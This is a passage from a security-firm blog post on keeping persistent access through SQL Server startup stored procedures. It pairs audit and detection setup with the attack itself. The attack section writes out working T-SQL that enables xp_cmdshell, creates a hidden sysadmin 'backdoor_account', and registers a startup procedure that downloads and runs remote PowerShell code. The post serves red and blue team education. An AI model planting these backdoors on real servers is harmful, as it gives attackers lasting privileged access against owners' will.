+<img class="alignnone wp-image-21658 size-medium" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20265'%3E%3C/svg%3E" alt="" width="300" height="265" data-lazy-src="https://www.netspi.com/wp-content/uploads/RTT-Favicon_Red.png" /><noscript><img class="alignnone wp-image-21658 size-medium" src="http://www.netspi.com/wp-content/uploads/RTT-Favicon_Red.png" alt="" width="300" height="265" /></noscript><br />
+</span><br />
+<a href="http://www.netspi.com/technology/red-team-toolkit/">Red Team Toolkit</a></div>
+<div class="mega-block-desc"><span style="font-weight: 400;">The most sophisticated suite of adversary simulation tools.</span></div>
+</div>
+</div>
+</div>
+		</li></ul>
+</li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-align-bottom-left mega-menu-flyout mega-menu-item-21741' id='mega-menu-item-21741'><a class="mega-menu-link" href="https://www.netspi.com/plans/" tabindex="0">PTaaS Plans</a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-align-bottom-left mega-menu-flyout mega-menu-item-21644' id='mega-menu-item-21644'><a class="mega-menu-link" href="https://www.netspi.com/training/" tabindex="0">Training</a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-megamenu mega-menu-item-has-children mega-align-bottom-left mega-menu-megamenu mega-menu-item-20875' id='mega-menu-item-20875'><a class="mega-menu-link" href="/resources/" aria-haspopup="true" aria-expanded="false" tabindex="0">Resources<span class="mega-indicator"></span></a>
+<ul class="mega-sub-menu">
+<li class='mega-menu-item mega-menu-item-type-widget widget_text mega-menu-columns-1-of-4 mega-menu-item-text-18' id='mega-menu-item-text-18'><h4 class="mega-block-title">Featured</h4>			<div class="textwidget"><div class="mega-menu-video">
+<div class="mega-menu-videoblock"><img class="alignnone size-medium wp-image-20907" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20232'%3E%3C/svg%3E" alt="" width="300" height="232" data-lazy-srcset="https://www.netspi.com/wp-content/uploads/2021/01/Best-Practices-for-Your-Pentesting-Program_HOMEPAGE-300x232.jpg 300w, https://www.netspi.com/wp-content/uploads/2021/01/Best-Practices-for-Your-Pentesting-Program_HOMEPAGE-1024x792.jpg 1024w, https://www.netspi.com/wp-content/uploads/2021/01/Best-Practices-for-Your-Pentesting-Program_HOMEPAGE-768x594.jpg 768w, https://www.netspi.com/wp-content/uploads/2021/01/Best-Practices-for-Your-Pentesting-Program_HOMEPAGE-1200x928.jpg 1200w, https://www.netspi.com/wp-content/uploads/2021/01/Best-Practices-for-Your-Pentesting-Program_HOMEPAGE.jpg 1396w" data-lazy-sizes="(max-width: 300px) 100vw, 300px" data-lazy-src="https://www.netspi.com/wp-content/uploads/2021/01/Best-Practices-for-Your-Pentesting-Program_HOMEPAGE-300x232.jpg" /><noscript><img class="alignnone size-medium wp-image-20907" src="https://www.netspi.com/wp-content/uploads/2021/01/Best-Practices-for-Your-Pentesting-Program_HOMEPAGE-300x232.jpg" alt="" width="300" height="232" srcset="https://www.netspi.com/wp-content/uploads/2021/01/Best-Practices-for-Your-Pentesting-Program_HOMEPAGE-300x232.jpg 300w, https://www.netspi.com/wp-content/uploads/2021/01/Best-Practices-for-Your-Pentesting-Program_HOMEPAGE-1024x792.jpg 1024w, https://www.netspi.com/wp-content/uploads/2021/01/Best-Practices-for-Your-Pentesting-Program_HOMEPAGE-768x594.jpg 768w, https://www.netspi.com/wp-content/uploads/2021/01/Best-Practices-for-Your-Pentesting-Program_HOMEPAGE-1200x928.jpg 1200w, https://www.netspi.com/wp-content/uploads/2021/01/Best-Practices-for-Your-Pentesting-Program_HOMEPAGE.jpg 1396w" sizes="(max-width: 300px) 100vw, 300px" /></noscript></div>
+</div>
+<p>Best Practices for Your Vulnerability Management Program</p>
+<p><a href="https://www.netspi.com/resources/tip-sheets/best-practices-for-your-vulnerability-management-program/">Get This Tip Sheet <i class="fas fa-arrow-right"></i></a></p>
+<div></div>
+<div></div>
+</div>
+		</li><li class='mega-menu-item mega-menu-item-type-widget widget_text mega-menu-columns-1-of-4 mega-menu-item-text-19' id='mega-menu-item-text-19'>			<div class="textwidget"><div class="mega-menu-blocks">
+<div class="mega-menu-blocks-col">
+<div class="mega-block-tite"><span class="img-icon"><br />
+<img class="size-full wp-image-20908 alignleft" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2027%2020'%3E%3C/svg%3E" alt="" width="27" height="20" data-lazy-src="https://www.netspi.com/wp-content/uploads/2021/02/blog-icon.svg" /><noscript><img class="size-full wp-image-20908 alignleft" src="http://www.netspi.com/wp-content/uploads/2021/02/blog-icon.svg" alt="" width="27" height="20" /></noscript><br />
+</span><br />
+<a href="https://www.netspi.com/blogs/">Blog</a></div>
+<div class="mega-block-desc"><span style="font-weight: 400;">Read the latest technical and business insights.</span></div>
+<div></div>
+</div>
+<div class="mega-block-desc">
+<div class="mega-block-desc">
+<div class="mega-block-tite"><span class="img-icon"><img class="wp-image-20909 size-full alignleft" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%2020'%3E%3C/svg%3E" alt="" width="“27”" height="20" data-lazy-src="https://www.netspi.com/wp-content/uploads/2021/02/webinar-icon-1.svg" /><noscript><img class="wp-image-20909 size-full alignleft" src="http://www.netspi.com/wp-content/uploads/2021/02/webinar-icon-1.svg" alt="" width="“27”" height="20" /></noscript><br />
+</span><br />
+<a href="https://www.netspi.com/webinars/">Webinars</a></div>
+<div class="mega-block-desc"><span style="font-weight: 400;">Learn from NetSPI’s technical and business experts.</span></div>
+</div>
+</div>
+</div>
+</div>
+		</li><li class='mega-menu-item mega-menu-item-type-widget widget_text mega-menu-columns-1-of-4 mega-menu-item-text-20' id='mega-menu-item-text-20'>			<div class="textwidget"><div class="mega-menu-blocks">
+<div class="mega-menu-blocks-col">
+<div class="mega-block-tite"><span class="img-icon"><br />
+<img class="wp-image-20909 size-full alignleft" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2027%2020'%3E%3C/svg%3E" alt="" width="27" height="20" data-lazy-src="https://www.netspi.com/wp-content/uploads/2021/02/podcasts-icon-1.svg" /><noscript><img class="wp-image-20909 size-full alignleft" src="http://www.netspi.com/wp-content/uploads/2021/02/podcasts-icon-1.svg" alt="" width="27" height="20" /></noscript><br />
+</span><br />
+<a href="https://www.netspi.com/agentofinfluence/">Podcasts</a></div>
+<div class="mega-block-desc"><span style="font-weight: 400;">Hear from leaders in the industry.</span></div>
+</div>
+<div class="mega-menu-blocks-col">
+<div class="mega-block-desc">
+<div class="mega-block-tite"><span class="img-icon"><br />
+<img class="wp-image-20909 size-full alignleft" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2030%2020'%3E%3C/svg%3E" alt="" width="30" height="20" data-lazy-src="https://www.netspi.com/wp-content/uploads/2021/02/ebook-icon.svg" /><noscript><img class="wp-image-20909 size-full alignleft" src="http://www.netspi.com/wp-content/uploads/2021/02/ebook-icon.svg" alt="" width="30" height="20" /></noscript><br />
+</span><br />
+<a href="https://www.netspi.com/resources/">Tip Sheets &amp; More</a></div>
+<div class="mega-block-desc"><span style="font-weight: 400;">Checklists, eBooks, infographics, and more.</span></div>
+</div>
+</div>
+</div>
+</div>
+		</li><li class='mega-menu-item mega-menu-item-type-widget widget_text mega-menu-columns-1-of-4 mega-menu-item-text-21' id='mega-menu-item-text-21'>			<div class="textwidget"><div class="mega-menu-blocks">
+<div class="mega-menu-blocks-col">
+<div class="mega-block-tite"><span class="img-icon"><br />
+<img class="size-full wp-image-20908 alignleft" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2030%2020'%3E%3C/svg%3E" alt="" width="30" height="20" data-lazy-src="https://www.netspi.com/wp-content/uploads/2021/02/open-source-tool-icon-1.svg" /><noscript><img class="size-full wp-image-20908 alignleft" src="http://www.netspi.com/wp-content/uploads/2021/02/open-source-tool-icon-1.svg" alt="" width="30" height="20" /></noscript><br />
+</span><br />
+<a href="https://www.netspi.com/open-source-tools/">Open Source Tools</a></div>
+<div class="mega-block-desc"><span style="font-weight: 400;">Security tools for everyone.</span></div>
+</div>
+<div class="mega-menu-blocks-col">
+<div class="mega-block-desc"></div>
+<div>
+<div class="mega-block-tite"><span class="img-icon"><img class="wp-image-20909 size-full alignleft" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2030%2020'%3E%3C/svg%3E" alt="" width="30" height="20" data-lazy-src="https://www.netspi.com/wp-content/uploads/2021/02/sql-injection-wiki-icon-1.svg" /><noscript><img class="wp-image-20909 size-full alignleft" src="http://www.netspi.com/wp-content/uploads/2021/02/sql-injection-wiki-icon-1.svg" alt="" width="30" height="20" /></noscript><br />
+</span><br />
+<a href="https://sqlwiki.netspi.com/" target="_blank" rel="noopener">SQL Injection Wiki</a></div>
+<div class="mega-block-desc"><span style="font-weight: 400;">Your resource for SQL Injection vulnerabilities.</span></div>
+</div>
+</div>
+</div>
+</div>
+		</li></ul>
+</li><li class='mega-xs-menu-hidden mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-align-bottom-left mega-menu-flyout mega-menu-item-24717 xs-menu-hidden' id='mega-menu-item-24717'><a target="_blank" class="mega-menu-link" href="https://resolve.netspi.com/" tabindex="0">Login</a></li><li class='mega-xs-menu-hidden mega-menu-quote-btn mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-align-bottom-left mega-menu-flyout mega-menu-item-21954 xs-menu-hidden menu-quote-btn' id='mega-menu-item-21954'><a class="mega-menu-link" href="https://www.netspi.com/contact-us/" tabindex="0">Get a Quote</a></li></ul></div>						</div>
+
+						<div class="head-user-info head-menu-loged">
+							<ul id="menu-header-right-menu" class="menu"><li id="menu-item-22062" class="btn-one menu-item menu-item-type-custom menu-item-object-custom menu-item-22062"><a target="_blank" rel="noopener" href="https://resolve.netspi.com/">Login</a></li>
+<li id="menu-item-24782" class="site-btn small-padding menu-item menu-item-type-post_type menu-item-object-page menu-item-24782"><a href="https://www.netspi.com/contact-us/">Get a Quote</a></li>
+</ul>							<ul style="display:none;">
+								<li>
+																			<a class="btn-one" href="https://resolve.netspi.com/" target="_blank">
+											Login										</a>
+																	</li>   
+								<li>
+																			<a class="site-btn small-padding" href="http://www.netspi.com/contact-us/" target="">
+											Get a Quote										</a>
+																	</li>                                             
+							</ul>
+						</div>
+					</div>
+				</div> <!-- #et-top-navigation -->
+			</div> <!-- .container -->			
+		</header> <!-- #main-header -->
+
+	<main id="primary" class="site-main casestudy-single">
+
+		
+<article id="post-6091" class="post-6091 post type-post status-publish format-standard hentry category-technical category-network-penetration-testing tag-sql-server tag-powershell tag-database-auditing tag-persistence tag-red-team tag-startup-stored-procedures" >
+
+    <section class="section-padding bg-F6F6F6 intro-block overflow-hidden vector-one full-width-block">
+        <div class="container">
+            <div class="row">
+                <div class="col s12 m12 center">
+                    <div class="block-relative block-content">
+                        <a class="back-btn" href="">
+                            <img class="red-arrow" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%207%2010'%3E%3C/svg%3E" width="7" height="10" data-lazy-src="https://www.netspi.com/wp-content/themes/netspi/assets/images/back-arrow.svg"><noscript><img class="red-arrow" src="https://www.netspi.com/wp-content/themes/netspi/assets/images/back-arrow.svg" width="7" height="10"></noscript>
+                            <img class="black-arrow" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%207%2010'%3E%3C/svg%3E" width="7" height="10" data-lazy-src="https://www.netspi.com/wp-content/themes/netspi/assets/images/back-black-arrow.svg"><noscript><img class="black-arrow" src="https://www.netspi.com/wp-content/themes/netspi/assets/images/back-black-arrow.svg" width="7" height="10"></noscript> Back</a>
+                        <div class="page-head">
+                            <h1 class="entry-title">Maintaining Persistence via SQL Server – Part 1: Startup Stored Procedures</h1>                        </div>
+                    </div>
+                </div>				
+            </div>
+                            <div class="row post-no-banner-cat">
+                    <div class="col s12 m2 center"></div>
+                    <div class="col s12 m8 center">
+                        <div class="post-banner-cat">
+                            <div class="post-metadata"><span class="posted-on"><time class="entry-date published" datetime="2016-03-07T07:00:24+00:00">March 7, 2016</time></span> | <span class="byline"> <span class="author vcard"><a class="url fn n" href="https://www.netspi.com/author/scott-sutherland/">Scott Sutherland</a></span></span></div>
+                            <div class="no-banner-categories-list">							
+                                <div class="row"><div class="col s12 category-box"><span class="new badge left" data-badge-caption=""><a href="https://www.netspi.com/blog/technical/">Technical Blog</a>
+						</span><span class="new badge left" data-badge-caption=""><a href="https://www.netspi.com/blog/technical/network-penetration-testing/">Network Penetration Testing</a>
+						</span></div></div>							
+                            </div>
+                        </div>					
+                    </div>
+                    <div class="col s12 m2 center"></div>
+                </div>
+            
+        </div>
+    </section>
+
+    <div class="container">
+        
+        
+
+         
+                    <div class="whitebox-intro single-content whitebox-intro-no-banner">
+                        <div class="row">  
+                        	        	   
+                        <div class="col s12 m12 l12">
+                            <div class="left-block">
+                                <p>During red team and penetration test engagements, one common goal is to maintain access to target environments while security teams attempt to identify and remove persistence methods. There are many ways to maintain persistent access to Windows environments. However, detective controls tend to focus on compromised account identification and persistence methods at the operating system layer. While prioritizing detective control development in those areas is a good practice, common database persistence methods are often overlooked.</p>
+<p>In this blog series, I&#8217;m planning to take a look at few techniques for maintaining access through SQL Server and how they can be detected by internal security teams. Hopefully they will be interesting to both red and blue teams.</p>
+<p>Below is an overview of what will be covered in this blog:</p>
+<ul>
+<li><a href="#why">Why use SQL Server as a Persistence Method?</a></li>
+<li><a href="#intro">Introduction to Startup Stored Procedures</a></li>
+<li><a href="#detection">Startup Stored Procedure Detection</a></li>
+<li><a href="#creation">Startup Stored Procedure Creation</a></li>
+<li><a href="#review">Startup Stored Procedure Code Review</a></li>
+<li><a href="#removal">Startup Stored Procedure Removal</a></li>
+<li><a href="#powershell">Automating the Attack</a></li>
+</ul>
+<h3 id="why">Why use SQL Server as a Persistence Method?</h3>
+<p>It may not be immediately obvious why anyone would use SQL Server or other database platforms to maintain access to an environment, so I&#8217;ve provided some of the advantages below.</p>
+<ol>
+<li>The .mdf files that SQL Server uses to store data and other objects such as stored procedures are constantly changing, so there is no easy way to use File Integrity Monitoring (FIM) to identify database layer persistence methods.</li>
+<li>SQL Server persistence methods that interact with the operating systems will do so under the context of the associated SQL Server service account. This helps make potentially malicious actions appear more legitimate.</li>
+<li>It&#8217;s very common to find SQL Server service accounts configured with local administrative or LocalSystem privileges. This means that in most cases any command and control code running from SQL Server will have local administrative privileges.</li>
+<li>Very few databases are configured to audit for common Indicators of Compromise (IoC) and persistence methods.</li>
+</ol>
+<p>With that out of the way, let&#8217;s learn a little about stored procedures.</p>
+<h3 id="intro">Introduction to Startup Stored Procedures</h3>
+<p>In SQL Server, stored procedures are basically chunks of SQL code intended for reuse that get compiled into a single execution plan. Similar to functions, they can accept parameters and provide output to the user. SQL Server ships with quite a few native stored procedures, but they can also be user defined. Once logged into SQL Server, it&#8217;s possible to execute stored procedures that the current user has privileges to execute. For more general information regarding stored procedures, visit <a href="https://technet.microsoft.com/en-us/library/aa174792(v=sql.80).aspx" target="_blank" rel="noopener noreferrer">https://technet.microsoft.com/en-us/library/aa174792(v=sql.80).aspx</a>.</p>
+<p>The native sp_procoption stored procedure can be used to configure user defined stored procedures to run when SQL Server is started or restarted. The general idea is very similar to the <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa376977(v=vs.85).aspx" target="_blank" rel="noopener noreferrer">&#8220;run&#8221; and &#8220;run once&#8221; registry keys</a> commonly used for persistence by developers, malware, and penetration testers. Before we get started on creating our evil startup stored procedures there are a few things to be aware of.</p>
+<p>The stored procedures configured for automatic execution at start time:</p>
+<ul>
+<li>Must exist in the Master database</li>
+<li>Cannot accept INPUT or OUTPUT parameters</li>
+<li>Must be marked for automatic execution by a sysadmin</li>
+</ul>
+<p><b>General Note</b>: Based on my time playing with this in a lab environment, all startup stored procedures are run under the context of the sa login, regardless of what login was used to flag the stored procedure for automatic execution. Even if the sa login is disabled, the startup procedures will still run under the sa context when the service is restarted.</p>
+<h3 id="detection">Startup Stored Procedure Detection</h3>
+<p>In this section I&#8217;ve provided an example script that can be used to enable audit features in SQL Server that will log potentially malicious startup procedure activities to the Windows Application event log.</p>
+<p>Normally I would introduce the attack setup first, but if the audit controls are not enabled ahead of time the events we use to detect the attack won&#8217;t show up in the Windows application event log.</p>
+<p><b>Important Note</b>: Be aware that the sysadmin privileges are required to run the script, and recommendations in this section will not work on SQL Server Express, because SQL Server Auditing is a commercial feature. SQL Server Auditing can be used to monitor all kinds of database activity. For those who are interested in learning more I recommend checking out this Microsoft site. <a href="https://technet.microsoft.com/en-us/library/cc280386(v=sql.110).aspx" target="_blank" rel="noopener noreferrer">https://technet.microsoft.com/en-us/library/cc280386(v=sql.110).aspx</a></p>
+<p><b>Audit Setup Instructions</b><br />
+Follow the instructions below to enable auditing:</p>
+<ol>
+<li>Create and enable a SERVER AUDIT.
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">-- Select master database
+USE master
+
+-- Setup server audit to log to application log
+CREATE SERVER AUDIT Audit_StartUp_Procs
+TO APPLICATION_LOG
+WITH (QUEUE_DELAY = 1000, ON_FAILURE = CONTINUE)
+
+-- Enable server audit
+ALTER SERVER AUDIT Audit_StartUp_Procs
+WITH (STATE = ON)</pre>
+</li>
+<li>Create an enabled SERVER AUDIT SPECIFICATION. This will enable auditing of defined server level events. In this example, it&#8217;s been configured to monitor group changes, server setting changes, and audit setting changes.
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">-- Create server audit specification
+CREATE SERVER AUDIT SPECIFICATION Audit_StartUp_Procs_Server_Spec
+FOR SERVER AUDIT Audit_StartUp_Procs
+ADD (SERVER_ROLE_MEMBER_CHANGE_GROUP), 
+
+-- track group changes
+ADD (SERVER_OPERATION_GROUP), 
+
+-- track server setting changes
+ADD (AUDIT_CHANGE_GROUP) 
+
+-- track audit setting changes
+WITH (STATE = ON)</pre>
+</li>
+<li>Create an enabled DATABASE AUDIT SPECIFICATION. This will enable auditing of specific database level events. In this case, the execution of the sp_procoption procedure will be monitored.
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">-- Create the database audit specification
+CREATE DATABASE AUDIT SPECIFICATION Audit_StartUp_Procs_Database_Spec
+FOR SERVER AUDIT Audit_StartUp_Procs
+ADD (EXECUTE
+ON master..sp_procoption BY public ) 
+
+-- sp_procoption execution
+WITH (STATE = ON)
+GO</pre>
+</li>
+<li>All enabled server and database level audit specifications can be viewed with the queries below. Typically, sysadmin privileges are required to view them.
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">-- List enabled server specifications
+SELECT		audit_id, 
+        a.name as audit_name, 
+        s.name as server_specification_name,
+        d.audit_action_name,
+        s.is_state_enabled,
+        d.is_group,
+        d.audit_action_id,	
+        s.create_date,
+        s.modify_date
+FROM sys.server_audits AS a
+JOIN sys.server_audit_specifications AS s
+ON a.audit_guid = s.audit_guid
+JOIN sys.server_audit_specification_details AS d
+ON s.server_specification_id = d.server_specification_id
+WHERE s.is_state_enabled = 1
+
+-- List enabled database specifications
+SELECT	a.audit_id,
+        a.name as audit_name,
+        s.name as database_specification_name,
+        d.audit_action_name,
+        s.is_state_enabled,
+        d.is_group,
+        s.create_date,
+        s.modify_date,
+        d.audited_result
+FROM sys.server_audits AS a
+JOIN sys.database_audit_specifications AS s
+ON a.audit_guid = s.audit_guid
+JOIN sys.database_audit_specification_details AS d
+ON s.database_specification_id = d.database_specification_id
+WHERE s.is_state_enabled = 1</pre>
+<p>If you&#8217;re interested in finding out about other server and database audit options, you can get a full list using the query below.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Select DISTINCT action_id,name,class_desc,parent_class_desc,containing_group_name from sys.dm_audit_actions order by parent_class_desc,containing_group_name,name</pre>
+<pre class="lang:mysql decode:true "></pre>
+</li>
+</ol>
+<h3 id="creation">Startup Stored Procedure Creation</h3>
+<p>Now for the fun part. The code examples provided in this section will create two stored procedures and configure them for automatic execution. As a result, the stored procedures will run the next time a patch is applied to SQL Server, or the server is restarted. As mentioned before, sysadmin privileges will be required.</p>
+<p><b>Note</b>: This example was performed over a direct database connection, but could potentially be executed through SQL injection as well.</p>
+<ol>
+<li>If you&#8217;re trying this out at home, you can download and install SQL Server with SQL Server Management Studio Express to use for connecting to the remote SQL Server. <a href="https://www.microsoft.com/en-us/download/details.aspx?id=42299" target="_blank" rel="noopener noreferrer">https://www.microsoft.com/en-us/download/details.aspx?id=42299</a>.</li>
+<li>Log into the (commercial version of) SQL Server with sysadmin privileges.</li>
+<li>Enable the xp_cmdshell stored procedure. This may not be required, but xp_cmdshell is disabled by default.
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">-- Enabled xp_cmdshell
+sp_configure 'show advanced options',1
+RECONFIGURE
+GO
+
+sp_configure 'xp_cmdshell',1
+RECONFIGURE
+GO</pre>
+<p>When a system setting like &#8220;xp_cmdshell&#8221; is changed, the Windows Application event log should include event ID 15457. Also, event ID 33205 should show up with a statement field set to &#8220;reconfigure&#8221;. I don&#8217;t see xp_cmdshell enabled very often. So most attackers will have to enable it to perform OS level operations.</p>
+<p><img class="alignnone size-full wp-image-6095" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201018%20721'%3E%3C/svg%3E" alt="SQL_Persistence_Pt1_Sutherland_1" width="1018" height="721" data-lazy-src="https://www.netspi.com/wp-content/uploads/2016/03/SQL_Persistence_Pt1_Sutherland_1.png" /><noscript><img class="alignnone size-full wp-image-6095" src="https://www.netspi.com/wp-content/uploads/2016/03/SQL_Persistence_Pt1_Sutherland_1.png" alt="SQL_Persistence_Pt1_Sutherland_1" width="1018" height="721" /></noscript></li>
+<li>Create a stored procedure to add a new sysadmin Login using the query below.
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">------------------------------
+-- Create a stored procedure 1
+------------------------------
+USE MASTER
+GO
+
+CREATE PROCEDURE sp_add_backdoor_account
+AS
+
+-- create sql server login backdoor_account
+CREATE LOGIN backdoor_account WITH PASSWORD = 'Password123!';
+
+-- Add backdoor_account to sysadmin fixed server role
+EXEC sp_addsrvrolemember 'backdoor_account', 'sysadmin';
+
+GO</pre>
+</li>
+<li>Create a stored procedure to use the xp_cmdshell stored procedure to download and execute a PowerShell payload from the internet using the query below. The script in the example simply writes a c:\temp\helloworld.txt file, but you can use any PowerShell payload. Something like a<a href="http://www.powershellempire.com/"> PowerShell Empire</a> agent could be handy.
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">------------------------------
+-- Create a stored procedure 2
+------------------------------
+USE MASTER
+GO
+
+CREATE PROCEDURE sp_add_backdoor
+AS
+-- Download and execute PowerShell code from the internet
+EXEC master..xp_cmdshell 'powershell -C "Invoke-Expression (new-object System.Net.WebClient).DownloadString(''https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/helloworld.ps1'')"'
+GO</pre>
+</li>
+<li>Configure the stored procedures to run when the SQL Server service is restarted using the query below.
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">------------------------------------------------
+-- Configure stored procedure to run at startup
+------------------------------------------------
+-- Set 'sp_add_backdoor_account' to auto run
+EXEC sp_procoption @ProcName = 'sp_add_backdoor_account',
+@OptionName = 'startup',
+@OptionValue = 'on';
+
+-- Setup 'sp_add_backdoor' to auto run
+EXEC sp_procoption @ProcName = 'sp_add_backdoor',
+@OptionName = 'startup',
+@OptionValue = 'on';</pre>
+<p>After execution, the event ID 33205 should show up in the Windows Application event log if auditing has been enabled. The &#8220;object_name&#8221; should contain &#8220;sp_procoption&#8221;, and the name of the startup stored procedure can be found in the &#8220;statement&#8221; field. I haven&#8217;t seen this option used very often in production environments. So alerting on it shouldn&#8217;t generate too many false positives. Below is an example of the event output.</p>
+<p><img class="alignnone size-large wp-image-6096" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20640%20454'%3E%3C/svg%3E" alt="SQL_Persistence_Pt1_Sutherland_2" width="640" height="454" data-lazy-src="https://www.netspi.com/wp-content/uploads/2016/03/SQL_Persistence_Pt1_Sutherland_2-1024x726.png" /><noscript><img class="alignnone size-large wp-image-6096" src="https://www.netspi.com/wp-content/uploads/2016/03/SQL_Persistence_Pt1_Sutherland_2-1024x726.png" alt="SQL_Persistence_Pt1_Sutherland_2" width="640" height="454" /></noscript></li>
+<li>Confirm the configuration worked using the query below.
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">-- List stored procedures mark for automatic execution
+SELECT [name] FROM sysobjects
+WHERE type = 'P'
+AND OBJECTPROPERTY(id, 'ExecIsStartUp') = 1;</pre>
+</li>
+<li>If you&#8217;re doing this lab on a test instance on your own system, then you can restart the SQL Server service. If you&#8217;re performing an actual penetration test, you&#8217;ll have to wait for the service or server to restart before the procedures are executed. Usually that will happen during standard patch cycles. So if you&#8217;re procedures start a reverse shell you may have to wait a while.
+<p><strong>Very Important Note</strong>: Only perform this step in a lab environment and NEVER restart a production service. Unless of course you want to be attacked by an angry mob of DBAs and business line owners. That being said, you can restart the service with the sc or the PowerShell restart-service commands. However, if you&#8217;re a GUI fan you can just use services.msc as shown below.<img class="alignnone size-full wp-image-6097" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20816%20600'%3E%3C/svg%3E" alt="SQL_Persistence_Pt1_Sutherland_3" width="816" height="600" data-lazy-src="https://www.netspi.com/wp-content/uploads/2016/03/SQL_Persistence_Pt1_Sutherland_3.png" /><noscript><img class="alignnone size-full wp-image-6097" src="https://www.netspi.com/wp-content/uploads/2016/03/SQL_Persistence_Pt1_Sutherland_3.png" alt="SQL_Persistence_Pt1_Sutherland_3" width="816" height="600" /></noscript>When the SQL Server service restarts it will launch the startup procedures and Windows event ID 17135 is used to track that event as shown below.<img class="alignnone size-large wp-image-6098" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20640%20480'%3E%3C/svg%3E" alt="SQL_Persistence_Pt1_Sutherland_4" width="640" height="480" data-lazy-src="https://www.netspi.com/wp-content/uploads/2016/03/SQL_Persistence_Pt1_Sutherland_4-1024x768.png" /><noscript><img class="alignnone size-large wp-image-6098" src="https://www.netspi.com/wp-content/uploads/2016/03/SQL_Persistence_Pt1_Sutherland_4-1024x768.png" alt="SQL_Persistence_Pt1_Sutherland_4" width="640" height="480" /></noscript></li>
+<li>Verify that a new sysadmin login named &#8220;backdoor_account&#8221; was added.<img class="alignnone size-full wp-image-6099" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20988%20639'%3E%3C/svg%3E" alt="SQL_Persistence_Pt1_Sutherland_5" width="988" height="639" data-lazy-src="https://www.netspi.com/wp-content/uploads/2016/03/SQL_Persistence_Pt1_Sutherland_5.png" /><noscript><img class="alignnone size-full wp-image-6099" src="https://www.netspi.com/wp-content/uploads/2016/03/SQL_Persistence_Pt1_Sutherland_5.png" alt="SQL_Persistence_Pt1_Sutherland_5" width="988" height="639" /></noscript>When a login is added to the sysadmin fixed server role event ID 33205 should show up again in the application log. However, this time the &#8220;object_name&#8221; should contain &#8220;sysadmin&#8221;, and the name of the affected account can be found in the &#8220;statement&#8221; field. Sysadmins shouldn&#8217;t be changed too often in production environments, so this can also be a handy thing to monitor.<br />
+<img class="alignnone size-large wp-image-6100" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20640%20480'%3E%3C/svg%3E" alt="SQL_Persistence_Pt1_Sutherland_6" width="640" height="480" data-lazy-src="https://www.netspi.com/wp-content/uploads/2016/03/SQL_Persistence_Pt1_Sutherland_6-1024x768.png" /><noscript><img class="alignnone size-large wp-image-6100" src="https://www.netspi.com/wp-content/uploads/2016/03/SQL_Persistence_Pt1_Sutherland_6-1024x768.png" alt="SQL_Persistence_Pt1_Sutherland_6" width="640" height="480" /></noscript></li>
+</ol>
+<h3 id="review">Startup Stored Procedure Code Review</h3>
+<p>At this point you should be able to view the log entries described earlier (33205 and 17135). They should tell you what procedures to dig into. If you&#8217;re interested in what they&#8217;re doing, it&#8217;s possible to view the source code for all startup stored procedures with the query below.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">SELECT ROUTINE_NAME, ROUTINE_DEFINITION
+FROM MASTER.INFORMATION_SCHEMA.ROUTINES
+WHERE OBJECTPROPERTY(OBJECT_ID(ROUTINE_NAME),'ExecIsStartup') = 1</pre>
+<p>Be aware that you will need privileges to view them, but as a sysadmin it shouldn&#8217;t be an issue.</p>
+<h3 id="removal">Startup Stored Procedure Removal</h3>
+<p>My guess is that at some point you&#8217;ll want to remove your sample startup procedures and audit settings, so below is a removal script.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">-- Disable xp_cmdshell
+sp_configure 'xp_cmdshell',0
+reconfigure
+go
+
+sp_configure 'show advanced options',0
+reconfigure
+go
+
+--Stop stored procedures from starting up
+EXEC sp_procoption @ProcName = 'sp_add_backdoor',
+@OptionName = 'startup',
+@OptionValue = 'off';
+
+EXEC sp_procoption @ProcName = 'sp_add_backdoor_account',
+@OptionName = 'startup',
+@OptionValue = 'off';
+
+-- Remove stored procedures
+DROP PROCEDURE sp_add_backdoor
+DROP PROCEDURE sp_add_backdoor_account
+
+-- Disable and remove SERVER AUDIT
